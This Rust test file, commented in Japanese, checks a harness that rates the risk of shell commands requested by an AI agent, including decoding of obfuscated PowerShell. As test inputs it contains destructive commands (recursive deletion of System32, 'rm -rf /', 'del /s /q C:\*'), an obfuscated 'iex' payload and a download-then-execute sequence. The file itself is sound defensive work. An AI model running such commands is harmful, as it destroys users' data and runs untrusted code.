use std::collections::HashMap;
use std::sync::Mutex;

use async_trait::async_trait;
use harness_core::{
    Answers, CommandSubject, DecisionModel, DecodeOutcome, DecodedLayer, EncodedSource,
    FilePreview, LocatedSpan, PayloadEncoding, PermissionSubject, ProgramSubject, Question,
    RiskCheckError, TextEncoding,
};
use serde_json::{json, Value};

use super::*;

/// 問いの`id`ごとに決まった答えを返す判定モデル。危険度だけはコマンドの行ごとに変えられる。
/// 受けた呼び出し（state と問いの`id`）を控える。
struct FakeModel {
    risk: HashMap<String, f32>,
    needs_decoding: f32,
    reads_source: f32,
    sequence: f32,
    source: f32,
    truncated: bool,
    fail: bool,
    calls: Mutex<Vec<(Value, Vec<&'static str>)>>,
}

impl FakeModel {
    fn quiet() -> Self {
        Self {
            risk: HashMap::new(),
            needs_decoding: 0.05,
            reads_source: 0.05,
            sequence: 0.2,
            source: 0.1,
            truncated: false,
            fail: false,
            calls: Mutex::new(Vec::new()),
        }
    }

    fn with_risk(mut self, line: &str, score: f32) -> Self {
        self.risk.insert(line.to_string(), score);
        self
    }

    fn calls(&self) -> Vec<(Value, Vec<&'static str>)> {
        self.calls.lock().unwrap().clone()
    }
}

#[async_trait]
impl DecisionModel for FakeModel {
    async fn decide(
        &self,
        state: &Value,
        questions: &[Question],
    ) -> Result<Answers, RiskCheckError> {
        self.calls
            .lock()
            .unwrap()
            .push((state.clone(), questions.iter().map(|q| q.id).collect()));
        if self.fail {
            return Err(RiskCheckError("接続を拒まれた".into()));
        }
        let mut answers = serde_json::Map::new();
        for q in questions {
            let answer = match q.id {
                "risk" => {
                    let line = state["command"].as_str().unwrap_or_default();
                    json!({"score": self.risk.get(line).copied().unwrap_or(0.1)})
                }
                "needs_decoding" => json!({"noul": self.needs_decoding}),
                "reads_source" => json!({"noul": self.reads_source}),
                "sequence_risk" => json!({"score": self.sequence}),
                "source_risk" => json!({"score": self.source}),
                other => panic!("知らない問い: {other}"),
            };
            answers.insert(q.id.to_string(), answer);
        }
        Ok(Answers::new(Value::Object(answers), self.truncated))
    }
}

fn shell(line: &str) -> PermissionSubject {
    PermissionSubject::Command(CommandSubject::line_only(line))
}

fn with_preview(line: &str, path: &str, text: &str) -> PermissionSubject {
    let mut c = CommandSubject::line_only(line);
    c.previews.push(FilePreview {
        rel_path: path.into(),
        text: text.into(),
        truncated: false,
    });
    PermissionSubject::Command(c)
}

fn with_decoded(line: &str, text: &str) -> PermissionSubject {
    let mut c = CommandSubject::line_only(line);
    c.decoded.push(DecodedLayer {
        depth: 1,
        source: EncodedSource::EncodedCommand,
        outcome: DecodeOutcome::Text {
            encoding: TextEncoding::Utf16Le,
            text: text.into(),
        },
        in_file: None,
    });
    PermissionSubject::Command(c)
}

fn run(subject: &PermissionSubject, history: &[String], model: Option<&FakeModel>) -> RiskOutcome {
    run_with(subject, history, model, None)
}

fn run_with(
    subject: &PermissionSubject,
    history: &[String],
    model: Option<&FakeModel>,
    locator: Option<&FakeLocator>,
) -> RiskOutcome {
    run_full(subject, history, model, locator, None)
}

fn run_full(
    subject: &PermissionSubject,
    history: &[String],
    model: Option<&FakeModel>,
    locator: Option<&FakeLocator>,
    fallback: Option<&dyn FallbackJudge>,
) -> RiskOutcome {
    let model = model.map(|m| m as &dyn DecisionModel);
    let locator = locator.map(|l| l as &dyn SpanLocator);
    futures::executor::block_on(assess(subject, history, model, locator, fallback))
        .expect("判定する材料")
}

/// 決まった箇所を答える、場所を選ばせる部品。呼ばれた行を控える。
struct FakeLocator {
    spans: Vec<LocatedSpan>,
    lines: std::sync::Mutex<Vec<String>>,
}

impl FakeLocator {
    fn answering(spans: Vec<LocatedSpan>) -> Self {
        Self {
            spans,
            lines: std::sync::Mutex::new(Vec::new()),
        }
    }
}

#[async_trait]
impl SpanLocator for FakeLocator {
    async fn locate(&self, line: &str) -> Result<Vec<LocatedSpan>, String> {
        self.lines.lock().unwrap().push(line.to_string());
        Ok(self.spans.clone())
    }
}

/// 「解読が要る」と出て機械の解読が何も取れていなければ、LLM に場所を選ばせてハーネスが解読し、
/// **解読した中身を機械の判定にも判定モデルにも通す**。注記は出さない（解読できたので）。
#[test]
fn a_located_payload_is_decoded_by_the_harness_and_judged() {
    let codes =
        "82,101,109,111,118,101,45,73,116,101,109,32,67,58,92,87,105,110,100,111,119,115,92,120";
    let line = format!("iex ([char[]]({codes}) -join '')");
    let mut model = FakeModel::quiet().with_risk(r"Remove-Item C:\Windows\x", 1.9);
    model.needs_decoding = 0.9;
    let locator = FakeLocator::answering(vec![LocatedSpan {
        text: codes.to_string(),
        encoding: PayloadEncoding::CharCodes,
    }]);
    let out = run_with(&shell(&line), &[], Some(&model), Some(&locator));
    assert_eq!(
        locator.lines.lock().unwrap().as_slice(),
        std::slice::from_ref(&line)
    );
    assert!(
        matches!(&out.extra_decoded[0].outcome, DecodeOutcome::Text { text, .. } if text == r"Remove-Item C:\Windows\x"),
        "{:?}",
        out.extra_decoded
    );
    assert!(
        out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Damage {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        out.reasons
    );
    assert!(
        out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Model {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        out.reasons
    );
    assert!(!out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));
}

/// LLM が示した箇所が行に無い・何も示さないときは、何も解読せず注記を残す。
/// 機械の解読が既に取れているとき・解読が要らないと出たときは、LLM を呼ばない。
#[test]
fn the_locator_is_used_only_when_needed_and_its_misses_are_noted() {
    let mut wants = FakeModel::quiet();
    wants.needs_decoding = 0.9;
    let invented = FakeLocator::answering(vec![LocatedSpan {
        text: "R2V0LURhdGU=".into(),
        encoding: PayloadEncoding::Base64,
    }]);
    let out = run_with(&shell("iex $x"), &[], Some(&wants), Some(&invented));
    assert!(out.extra_decoded.is_empty(), "行に無い文字列を解読した");
    assert!(out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));

    let unused = FakeLocator::answering(Vec::new());
    run_with(
        &with_decoded("pwsh -enc AAAA", "Get-Date"),
        &[],
        Some(&wants),
        Some(&unused),
    );
    let quiet = FakeModel::quiet();
    run_with(&shell("ls"), &[], Some(&quiet), Some(&unused));
    assert!(
        unused.lines.lock().unwrap().is_empty(),
        "要らないのに LLM を呼んだ"
    );
}

/// **判定モデルが無くても、機械の判定でシステムの場所を消す行は「高」になる。** 対照: 普通の行は「要確認」。
#[test]
fn without_the_model_the_machine_judgement_alone_decides() {
    let high = run(&shell(r"Remove-Item C:\Windows\System32\x"), &[], None);
    assert_eq!(high.severity(), Severity::High);
    assert_eq!(high.basis, RiskBasis::MachineOnly);
    assert!(matches!(
        &high.reasons[0],
        RiskReason::Damage {
            origin: Origin::Command,
            ..
        }
    ));
    let plain = run(&shell("ls"), &[], None);
    assert_eq!(plain.severity(), Severity::NeedsReview);
    assert_eq!(plain.basis, RiskBasis::MachineOnly);
    assert!(plain.reasons.is_empty() && plain.notes.is_empty());
}

/// 判定モデルへは**測った2つの形**で聞く——危険度だけ（state は`command`だけ）と、流れと一緒に4問。
#[test]
fn the_model_is_asked_in_the_two_measured_shapes() {
    let model = FakeModel::quiet();
    let history = vec!["git status".to_string()];
    run(&shell("ls"), &history, Some(&model));
    let calls = model.calls();
    assert_eq!(calls.len(), 2, "{calls:?}");
    assert!(
        calls.contains(&(json!({"command": "ls"}), vec!["risk"])),
        "{calls:?}"
    );
    assert!(
        calls.contains(&(
            json!({"command": "ls", "history": ["git status"]}),
            vec!["risk", "needs_decoding", "reads_source", "sequence_risk"]
        )),
        "{calls:?}"
    );
}

/// 判定モデルの危険度が線を越えたら「高」。越えなければ「要確認」のまま（**低いは安全の保証ではない**ので、
/// 低いことを理由に何かを足しもしない）。
#[test]
fn the_model_verdict_makes_it_high_only_past_the_line() {
    let high = run(
        &shell("rm -rf /tmp/x"),
        &[],
        Some(&FakeModel::quiet().with_risk("rm -rf /tmp/x", 1.7)),
    );
    assert_eq!(high.severity(), Severity::High);
    assert_eq!(high.basis, RiskBasis::WithModel);
    assert!(
        high.reasons[0].describe_ja().contains("1.70 / 2"),
        "{:?}",
        high.reasons
    );
    let low = run(
        &shell("cargo build"),
        &[],
        Some(&FakeModel::quiet().with_risk("cargo build", 1.26)),
    );
    assert_eq!(low.severity(), Severity::NeedsReview);
    assert_eq!(low.basis, RiskBasis::WithModel);
}

/// 流れの危険度は、**流れがあるときだけ**足す（空なら、コマンド単独の危険度と同じものを測っているだけ）。
#[test]
fn the_sequence_counts_only_when_there_is_a_history() {
    let mut model = FakeModel::quiet();
    model.sequence = 1.8;
    let with_history = run(
        &shell("pwsh -File a.ps1"),
        &["curl http://x/a.ps1 -o a.ps1".into()],
        Some(&model),
    );
    assert!(with_history
        .reasons
        .iter()
        .any(|r| matches!(r, RiskReason::Sequence(_))));
    let without = run(&shell("pwsh -File a.ps1"), &[], Some(&model));
    assert!(!without
        .reasons
        .iter()
        .any(|r| matches!(r, RiskReason::Sequence(_))));
}

/// 解読した中身は、機械の判定にも判定モデルにも通す（[BUG-224] の中身を見ずに通さない）。
#[test]
fn decoded_content_is_judged_by_both() {
    let decoded = r"Remove-Item C:\Windows\System32\drivers -Recurse";
    let subject = with_decoded("pwsh -enc AAAA", decoded);
    let machine_only = run(&subject, &[], None);
    assert!(
        machine_only.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Damage {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        machine_only.reasons
    );
    let model = FakeModel::quiet().with_risk(decoded, 1.9);
    let both = run(&subject, &[], Some(&model));
    assert!(
        both.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Model {
                origin: Origin::Decoded { depth: 1 },
                ..
            }
        )),
        "{:?}",
        both.reasons
    );
    assert!(
        model
            .calls()
            .iter()
            .any(|(state, _)| state == &json!({"command": decoded})),
        "解読した中身の危険度を聞いていない"
    );
}

/// 解読が要りそうなのに何も解読できていないときだけ注記する。解読できていれば注記しない。
#[test]
fn an_undecoded_payload_is_noted_only_when_nothing_was_decoded() {
    let mut model = FakeModel::quiet();
    model.needs_decoding = 0.9;
    let undecoded = run(
        &shell("iex ([char[]](115,121) -join '')"),
        &[],
        Some(&model),
    );
    assert!(undecoded
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));
    let decoded = run(
        &with_decoded("pwsh -enc AAAA", "Get-Date"),
        &[],
        Some(&model),
    );
    assert!(!decoded
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UndecodedPayload { .. })));
}

/// 縛ったファイルの中身は、拡張子に関わらず判定モデルへ送る（D-123）。機械の被害判定（字面）だけ
/// スクリプトの拡張子に絞る。`run_program`でコードを走らせるときも中身を聞く。
#[test]
fn bound_files_are_asked_about_when_code_is_read_from_them() {
    let mut reading = FakeModel::quiet();
    reading.reads_source = 0.9;
    reading.source = 1.8;
    let out = run(
        &with_preview("pwsh ./setup.ps1", "setup.ps1", "Write-Host hi"),
        &[],
        Some(&reading),
    );
    assert!(
        out.reasons
            .iter()
            .any(|r| matches!(r, RiskReason::Model { origin: Origin::File { path }, .. } if path == "setup.ps1")),
        "{:?}",
        out.reasons
    );
    // 拡張子がスクリプトでないファイル（`cat notes.txt`）も、判定モデルへは送る（D-123。全ファイル）。
    // 機械の被害判定（字面で`rm -rf /`を探す）はこちらには掛からない——それは`goes_to_machine`が
    // 拡張子で絞る（下の `the_machine_assessment_...` テスト）。
    let mut non_script = FakeModel::quiet();
    non_script.reads_source = 0.2;
    non_script.source = 1.8;
    run(
        &with_preview("cat notes.txt", "notes.txt", "hello"),
        &[],
        Some(&non_script),
    );
    assert!(non_script
        .calls()
        .iter()
        .any(|(state, ids)| ids == &vec!["source_risk"] && state["path"] == "notes.txt"));
    // `run_program`でインタプリタを起こす。
    let mut program = ProgramSubject::plain("python", vec!["build.py".into()]);
    program.previews.push(FilePreview {
        rel_path: "build.py".into(),
        text: "print(1)".into(),
        truncated: false,
    });
    let model = FakeModel::quiet();
    run(&PermissionSubject::Program(program), &[], Some(&model));
    assert!(model
        .calls()
        .iter()
        .any(|(state, ids)| ids == &vec!["source_risk"] && state["path"] == "build.py"));
}

/// 読む先を縛れていないのに「ファイルから読む」と出たら注記する（中身を見ていないことを隠さない）。
#[test]
fn reading_code_from_an_unbound_file_is_noted() {
    let mut model = FakeModel::quiet();
    model.reads_source = 0.9;
    let out = run(&shell(r"iex (gc .\a.ps1 -Raw)"), &[], Some(&model));
    assert!(out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::UnboundSource { .. })));
}

/// **埋もれた1行は判定モデルが見落とす**ので、機械の判定がスクリプトの中身全体を見る。メモ（拡張子がスクリプトでない）は見ない。
#[test]
fn the_machine_judgement_reads_bound_scripts_but_not_notes() {
    let script = "Write-Host 1\nRemove-Item -Recurse -Force $env:USERPROFILE\nWrite-Host 2\n";
    let out = run(
        &with_preview(r"pwsh .\buried.ps1", "buried.ps1", script),
        &[],
        None,
    );
    assert!(
        out.reasons
            .iter()
            .any(|r| matches!(r, RiskReason::Damage { origin: Origin::File { path }, .. } if path == "buried.ps1")),
        "{:?}",
        out.reasons
    );
    // 対照: メモの中の行は、コードとして読めば当たる形（`rm -rf /`だけの行）にしてある——拡張子で外していることを確かめるため。
    let memo = "TODO\nrm -rf /\n";
    assert!(
        !system_damage::assess_line(memo).is_empty(),
        "対照が効いていない: コードとして読んでも当たらない中身になっている"
    );
    let notes = run(&with_preview("cat notes.txt", "notes.txt", memo), &[], None);
    assert!(notes.reasons.is_empty(), "{:?}", notes.reasons);
}

/// **拡張子の一覧がずれていた分も、いまは機械の判定が掛かる。**
///
/// 以前は承認でファイルを縛る側（`harness-tools`）と、中身へ機械の被害判定を掛ける側（ここ）が
/// 別々の一覧を持っていて中身がずれており、`.pyw`のようなファイルは**中身を読んでハッシュで縛り
/// 判定モデルへも送るのに、機械の被害判定だけ掛からない**状態だった（2026-10-04）。
/// ずれていた10種のうち、スクリプトとして中身が意味を持つものをここで固定する。
#[test]
fn the_extensions_that_used_to_be_missing_now_get_the_machine_judgement() {
    let script = "import shutil
shutil.rmtree('C:/Windows/System32')
";
    for ext in ["pyw", "mts", "cts", "pm", "vbe", "jse", "hta", "lua"] {
        let path = format!("clean.{ext}");
        let out = run(
            &with_preview(&format!("python {path}"), &path, script),
            &[],
            None,
        );
        assert!(
            out.reasons.iter().any(
                |r| matches!(r, RiskReason::Damage { origin: Origin::File { path: p }, .. } if *p == path)
            ),
            "{ext}: {:?}",
            out.reasons
        );
    }
    // `run_program`でコードを走らせる側は、もともと拡張子を問わず全部読む（対照）。
    let mut program = ProgramSubject::plain("python", vec!["clean.pyw".into()]);
    program.previews.push(FilePreview {
        rel_path: "clean.pyw".into(),
        text: script.into(),
        truncated: false,
    });
    let out = run(&PermissionSubject::Program(program), &[], None);
    assert!(
        out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Damage {
                origin: Origin::File { .. },
                ..
            }
        )),
        "{:?}",
        out.reasons
    );
}

/// 判定モデルが落ちていたら、機械の判定だけで決め、理由を1つだけ注記する。機械の判定の「高」は残る。
#[test]
fn a_failed_model_falls_back_to_the_machine_judgement_and_says_so_once() {
    let mut model = FakeModel::quiet();
    model.fail = true;
    let out = run(&shell(r"del /s /q C:\*"), &[], Some(&model));
    assert_eq!(out.basis, RiskBasis::MachineOnly);
    assert_eq!(out.severity(), Severity::High);
    assert_eq!(out.model_error(), Some("接続を拒まれた"));
    assert_eq!(
        out.notes
            .iter()
            .filter(|n| matches!(n, RiskNote::ModelUnavailable(_)))
            .count(),
        1
    );
}

/// fail-closed（D-124 ルール1）: 判定モデルを使えないのに**解読できない**難読化があれば、危険側へ倒す。
/// **確かめられなかっただけで、危険と判明したわけではない**（境界ではない。画面に高を出すだけ）。
/// 解読できた段は機械が中身を読むので、ここには当たらない（機械が解読できたケースの漏れを直した）。
#[test]
fn opaque_obfuscation_without_the_model_is_treated_as_high() {
    let has_cause = |out: &RiskOutcome| {
        out.reasons.iter().any(|r| {
            matches!(
                r,
                RiskReason::OpaqueObfuscation(ObfuscationCause::ModelUnavailable)
            )
        })
    };
    // 解読できない段（NotText。base64は読めたが文字にならない＝圧縮/暗号/実行ファイル）を持つ材料。
    let opaque = || {
        let mut c = CommandSubject::line_only("pwsh -enc AAAA");
        c.decoded.push(DecodedLayer {
            depth: 1,
            source: EncodedSource::EncodedCommand,
            outcome: DecodeOutcome::NotText,
            in_file: None,
        });
        PermissionSubject::Command(c)
    };
    // 判定モデルを使わない設定（model=None）。中身を読めないので危険側へ倒す。
    let out = run(&opaque(), &[], None);
    assert_eq!(out.severity(), Severity::High);
    assert!(has_cause(&out), "{:?}", out.reasons);

    // 判定モデルが落ちている（呼び出しが失敗する）ときも同じ。
    let mut failing = FakeModel::quiet();
    failing.fail = true;
    let out = run(&opaque(), &[], Some(&failing));
    assert_eq!(out.severity(), Severity::High);
    assert!(has_cause(&out));

    // 対照(1): 機械が解読できた段（Text・無害 Get-Date）＋model=None は、機械が読んだ結果で判定する。
    // 難読化そのものは引き金にしない（この漏れを直した）。
    let out = run(&with_decoded("pwsh -enc AAAA", "Get-Date"), &[], None);
    assert_eq!(out.severity(), Severity::NeedsReview);
    assert!(!has_cause(&out), "{:?}", out.reasons);

    // 対照(2): 解読できた段が危険（del）なら「高」だが、理由は機械の被害判定（Damage）であって難読化ではない。
    let out = run(&with_decoded("pwsh -enc AAAA", r"del /s /q C:\*"), &[], None);
    assert_eq!(out.severity(), Severity::High);
    assert!(!has_cause(&out), "{:?}", out.reasons);
    assert!(out
        .reasons
        .iter()
        .any(|r| matches!(r, RiskReason::Damage { .. })));

    // 対照(3): 難読化が無ければ、モデルが無くても倒さない。
    let out = run(&shell("git log"), &[], None);
    assert_eq!(out.severity(), Severity::NeedsReview);
    assert!(!has_cause(&out));
}

/// fail-closed（D-124 ルール2）: 判定モデルが使えても、解読の上限で止まってその先に難読化が残って
/// いれば危険側へ倒す。底まで解けて普通のコードになった段は、その中身を普通に判定する。
#[test]
fn hitting_the_decode_limit_is_treated_as_high_even_with_the_model() {
    let with_limit = || {
        let mut c = CommandSubject::line_only("pwsh -enc AAAA");
        c.decoded.push(DecodedLayer {
            depth: 4,
            source: EncodedSource::EncodedCommand,
            outcome: DecodeOutcome::DepthLimit { max_depth: 4 },
            in_file: None,
        });
        PermissionSubject::Command(c)
    };
    let has_cause = |out: &RiskOutcome| {
        out.reasons.iter().any(|r| {
            matches!(
                r,
                RiskReason::OpaqueObfuscation(ObfuscationCause::DepthLimited)
            )
        })
    };
    let out = run(&with_limit(), &[], Some(&FakeModel::quiet()));
    assert_eq!(out.severity(), Severity::High);
    assert!(has_cause(&out), "{:?}", out.reasons);

    // 対照: 底まで解けた段（Text）で、モデルが無害と言えば倒さない。
    let out = run(
        &with_decoded("pwsh -enc AAAA", "Get-Date"),
        &[],
        Some(&FakeModel::quiet()),
    );
    assert_eq!(out.severity(), Severity::NeedsReview);
    assert!(!has_cause(&out));
}

/// 長いファイルは先頭だけ送ったと注記する。
#[test]
fn a_cut_file_is_noted() {
    let mut model = FakeModel::quiet();
    model.reads_source = 0.9;
    model.truncated = true;
    let out = run(
        &with_preview("pwsh ./a.ps1", "a.ps1", "Write-Host 1"),
        &[],
        Some(&model),
    );
    assert!(out
        .notes
        .iter()
        .any(|n| matches!(n, RiskNote::FileCut { path } if path == "a.ps1")));
}

/// 書込先・その他の材料は判定しない（承認画面に危険度の行を出さない）。
#[test]
fn write_paths_and_text_are_not_judged() {
    assert!(machine(&PermissionSubject::WritePath("a.txt".into())).is_none());
    assert!(machine(&PermissionSubject::Text("x".into())).is_none());
    assert_eq!(subject_line(&PermissionSubject::Text("x".into())), None);
}

/// 鍵は判定に使う材料で変わる——流れ・縛ったファイルの中身・解読した中身のどれが違っても別の鍵。
#[test]
fn the_cache_key_changes_with_every_input_of_the_judgement() {
    let base = cache_key(&with_preview("pwsh a.ps1", "a.ps1", "x"), &[]).unwrap();
    assert_ne!(
        base,
        cache_key(&with_preview("pwsh a.ps1", "a.ps1", "y"), &[]).unwrap()
    );
    assert_ne!(
        base,
        cache_key(&with_preview("pwsh a.ps1", "a.ps1", "x"), &["ls".into()]).unwrap()
    );
    assert_ne!(
        cache_key(&with_decoded("pwsh -enc A", "Get-Date"), &[]).unwrap(),
        cache_key(&with_decoded("pwsh -enc A", "Get-Item"), &[]).unwrap()
    );
}

/// 理由の文には判定モデルが返した文字列が入らない（数値と固定の言い回しだけ）。
#[test]
fn reasons_are_written_with_fixed_wording() {
    let verdict = RiskVerdict::from_score(1.6).unwrap();
    assert_eq!(
        RiskReason::Model {
            verdict,
            origin: Origin::File {
                path: "a.ps1".into()
            }
        }
        .describe_ja(),
        "判定モデル: 1.60 / 2（共有データを失う・本番を壊し得る）（a.ps1 の中）"
    );
    assert_eq!(Severity::High.label_ja(), "高");
    assert_eq!(Severity::NeedsReview.label_ja(), "要確認");
    assert_eq!(Severity::NeedsReview.summary_hint(), None);
}

/// **縛れたスクリプトの中身は、モデルが「読まない」と言っても必ず判定する。**
///
/// 実測（2026-10-04）: `powershell -EncodedCommand <塊>` を解読して出てきた `uv run test.py` の
/// `test.py` は縛れて中身も手元にあったのに、**中身の判定が一度も走らず「要確認」のままだった**。
/// モデルが見るのはコマンドの行だけなので、行からファイルが見えない形では「読まない」と答える。
/// **縛れたかどうかはハーネスが知っている事実で、モデルに聞くことではない。**
#[test]
fn a_bound_script_is_judged_even_when_the_model_says_it_reads_no_source() {
    let mut model = FakeModel::quiet();
    model.reads_source = 0.1; // 「ソースコードは読まない」
    model.source = 1.8; // ただし中身は危険
    let out = run(
        &with_preview(
            "powershell -EncodedCommand AAAA",
            "test.py",
            "import shutil\nshutil.rmtree(x)\n",
        ),
        &[],
        Some(&model),
    );
    assert!(
        out.reasons.iter().any(
            |r| matches!(r, RiskReason::Model { origin: Origin::File { path }, .. } if path == "test.py")
        ),
        "縛れたスクリプトの中身が判定されていない: {:?}",
        out.reasons
    );
    assert!(model
        .calls()
        .iter()
        .any(|(state, ids)| ids == &vec!["source_risk"] && state["path"] == "test.py"));

    // コードでないファイル（メモ）は判定モデルへは送る（D-123。全ファイル）が、**機械の被害判定
    // （字面で `rm -rf /` を探す）は掛からない**——拡張子で絞るため。モデルは無害と言う（quiet）ので、
    // notes.txt から危険の理由が立たないことで、字面の判定が走っていないことを確かめる。
    let machine_only = FakeModel::quiet();
    let out = run(
        &with_preview("cat notes.txt", "notes.txt", "rm -rf /"),
        &[],
        Some(&machine_only),
    );
    assert!(
        machine_only
            .calls()
            .iter()
            .any(|(state, ids)| ids == &vec!["source_risk"] && state["path"] == "notes.txt"),
        "メモも判定モデルへは送る"
    );
    assert!(
        !out.reasons.iter().any(|r| matches!(
            r,
            RiskReason::Damage { origin: Origin::File { path }, .. } if path == "notes.txt"
        )),
        "メモの字面に機械の被害判定を掛けている: {:?}",
        out.reasons
    );
}

/// 決まった答えを返す LLM フォールバック判定の偽物（D-125）。
struct FakeFallback {
    verdict: Option<RiskVerdict>,
    fail: bool,
}

#[async_trait]
impl FallbackJudge for FakeFallback {
    async fn judge(&self, _line: &str) -> Result<Option<RiskVerdict>, String> {
        if self.fail {
            return Err("接続を拒まれた".into());
        }
        Ok(self.verdict)
    }
}

/// D-125: 判定モデルが使えないとき、LLM フォールバック判定を聞く（②）。判定できれば機械の fail-closed（③）
/// より先に効き、判定できなければ③へ落ちる。
#[test]
fn the_llm_fallback_runs_between_the_model_and_the_machine() {
    // 解読できない段（NotText）を持つ材料。フォールバックが無ければ③で「高」（ルール1）になる。
    let opaque = || {
        let mut c = CommandSubject::line_only("pwsh -enc AAAA");
        c.decoded.push(DecodedLayer {
            depth: 1,
            source: EncodedSource::EncodedCommand,
            outcome: DecodeOutcome::NotText,
            in_file: None,
        });
        PermissionSubject::Command(c)
    };

    // フォールバックが「危険」と判定 → basis=WithFallback、理由が付く。機械の fail-closed は掛からない。
    let danger = FakeFallback {
        verdict: Some(RiskVerdict::from_score(1.8).unwrap()),
        fail: false,
    };
    let out = run_full(&opaque(), &[], None, None, Some(&danger));
    assert_eq!(out.basis, RiskBasis::WithFallback);
    assert_eq!(out.severity(), Severity::High);
    assert!(out
        .reasons
        .iter()
        .any(|r| matches!(r, RiskReason::Model { .. })));
    assert!(!out.reasons.iter().any(|r| matches!(
        r,
        RiskReason::OpaqueObfuscation(ObfuscationCause::ModelUnavailable)
    )));

    // フォールバックが「無害」と判定 → basis=WithFallback、理由は付かない。難読化の fail-closed も掛からない
    // （②が判定したので③へ落ちない）。
    let harmless = FakeFallback {
        verdict: Some(RiskVerdict::from_score(0.1).unwrap()),
        fail: false,
    };
    let out = run_full(&opaque(), &[], None, None, Some(&harmless));
    assert_eq!(out.basis, RiskBasis::WithFallback);
    assert_eq!(out.severity(), Severity::NeedsReview);

    // フォールバックが「判定できない」（Ok(None)）→ ③の機械 fail-closed へ落ちる（高）。
    let abstain = FakeFallback {
        verdict: None,
        fail: false,
    };
    let out = run_full(&opaque(), &[], None, None, Some(&abstain));
    assert_eq!(out.basis, RiskBasis::MachineOnly);
    assert_eq!(out.severity(), Severity::High);

    // フォールバックが落ちている → ③へ落ちる（高）。
    let failing = FakeFallback {
        verdict: None,
        fail: true,
    };
    let out = run_full(&opaque(), &[], None, None, Some(&failing));
    assert_eq!(out.basis, RiskBasis::MachineOnly);
    assert_eq!(out.severity(), Severity::High);
}

/// 今のモック（`MockFallbackJudge`）は判定しないので、入れても挙動は機械判定（③）と同じ。
#[test]
fn the_mock_fallback_does_not_change_the_outcome() {
    let mut c = CommandSubject::line_only("pwsh -enc AAAA");
    c.decoded.push(DecodedLayer {
        depth: 1,
        source: EncodedSource::EncodedCommand,
        outcome: DecodeOutcome::NotText,
        in_file: None,
    });
    let subject = PermissionSubject::Command(c);
    let with_mock = run_full(&subject, &[], None, None, Some(&MockFallbackJudge));
    let without = run_full(&subject, &[], None, None, None);
    assert_eq!(with_mock.basis, RiskBasis::MachineOnly);
    assert_eq!(with_mock.severity(), without.severity());
    assert_eq!(with_mock.reasons, without.reasons);
}

// ---- D-126: 解けた包みへの判定モデルの点数は数えない ----

/// 包みの行（塊は手で組んだ段で置く。中身を新しく符号化しない）。
const WRAPPER: &str = "powershell -NoP -Enc AAAA";
/// 既存のフィクスチャ（`decoded_content_is_judged_by_both`）の危険な中身。
const DANGEROUS: &str = r"Remove-Item C:\Windows\System32\drivers -Recurse";

fn text_layer(depth: u32, text: &str) -> DecodedLayer {
    DecodedLayer {
        depth,
        source: EncodedSource::EncodedCommand,
        outcome: DecodeOutcome::Text {
            encoding: TextEncoding::Utf16Le,
            text: text.into(),
        },
        in_file: None,
    }
}

fn not_text_layer(depth: u32) -> DecodedLayer {
    DecodedLayer {
        depth,
        source: EncodedSource::EncodedCommand,
        outcome: DecodeOutcome::NotText,
        in_file: None,
    }
}

fn in_file(mut layer: DecodedLayer, path: &str) -> DecodedLayer {
    layer.in_file = Some(path.into());
    layer
}

fn with_layers(line: &str, layers: Vec<DecodedLayer>) -> PermissionSubject {
    let mut c = CommandSubject::line_only(line);
    c.decoded = layers;
    PermissionSubject::Command(c)
}

fn has_model_reason(out: &RiskOutcome, origin: &Origin) -> bool {
    out.reasons
        .iter()
        .any(|r| matches!(r, RiskReason::Model { origin: o, .. } if o == origin))
}

fn asked_risk_of(model: &FakeModel, text: &str) -> bool {
    model
        .calls()
        .contains(&(json!({ "command": text }), vec!["risk"]))
}

/// **包みの行への点数は数えず、解いた中身で決める。** 実測（RESULTS.md §1.10）で `Write-Host hello` を包んだ行は
/// 1.513 だった——中身ではなく綴りに反応した点数で「高」にしない。対照: 中身が危険なら、解いた段の点数で高。
#[test]
fn a_wrapper_line_is_judged_by_what_it_decodes_to() {
    let harmless = FakeModel::quiet()
        .with_risk(WRAPPER, 1.55)
        .with_risk("Write-Host hello", 0.05);
    let out = run(
        &with_layers(WRAPPER, vec![text_layer(1, "Write-Host hello")]),
        &[],
        Some(&harmless),
    );
    assert_eq!(out.severity(), Severity::NeedsReview, "{:?}", out.reasons);
    assert_eq!(out.basis, RiskBasis::WithModel);
    assert!(
        !has_model_reason(&out, &Origin::Command),
        "{:?}",
        out.reasons
    );
    assert!(
        asked_risk_of(&harmless, "Write-Host hello"),
        "解いた中身を聞いていない"
    );
    assert!(
        asked_risk_of(&harmless, WRAPPER),
        "行への問いは今どおり出す"
    );

    let dangerous = FakeModel::quiet()
        .with_risk(WRAPPER, 1.55)
        .with_risk(DANGEROUS, 1.9);
    let out = run(
        &with_layers(WRAPPER, vec![text_layer(1, DANGEROUS)]),
        &[],
        Some(&dangerous),
    );
    assert_eq!(out.severity(), Severity::High);
    assert!(
        has_model_reason(&out, &Origin::Decoded { depth: 1 }),
        "{:?}",
        out.reasons
    );
    assert!(
        !has_model_reason(&out, &Origin::Command),
        "{:?}",
        out.reasons
    );
}

/// 解けない塊しか無い行は、行への点数を残す（判定モデルが使えると D-124 ルール1が掛からず、塊に触れる判定は行しか無い）。
#[test]
fn a_line_with_only_an_undecodable_blob_keeps_its_score() {
    let model = FakeModel::quiet().with_risk(WRAPPER, 1.6);
    let out = run(
        &with_layers(WRAPPER, vec![not_text_layer(1)]),
        &[],
        Some(&model),
    );
    assert_eq!(out.severity(), Severity::High);
    assert!(
        has_model_reason(&out, &Origin::Command),
        "{:?}",
        out.reasons
    );
}

/// 解けた塊と解けない塊が混じる行も、行への点数を残す（「全部解けた」ときだけ数えない）。
#[test]
fn a_line_with_a_mix_of_decoded_and_undecodable_blobs_keeps_its_score() {
